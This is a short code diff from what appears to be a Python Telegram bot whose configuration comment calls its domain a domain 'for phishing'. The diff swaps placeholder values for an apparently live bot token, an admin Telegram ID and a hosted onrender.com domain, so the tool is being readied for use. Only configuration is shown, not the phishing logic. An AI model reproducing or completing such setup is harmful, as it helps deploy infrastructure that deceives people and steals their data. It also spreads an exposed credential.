@@ -27,9 +27,9 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Конфигурация
-BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
+BOT_TOKEN = "8061724548:AAGIGDd8HSSUgG59nXYYrUgYoA7uw0kI5LE"
 ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений
-DOMAIN = "https://ваш-домен.com"  # Ваш домен для фишинга
+DOMAIN = "https://dkwksk.onrender.com"  # Ваш домен для фишинга
 
 # Хранилище данных
 @dataclass
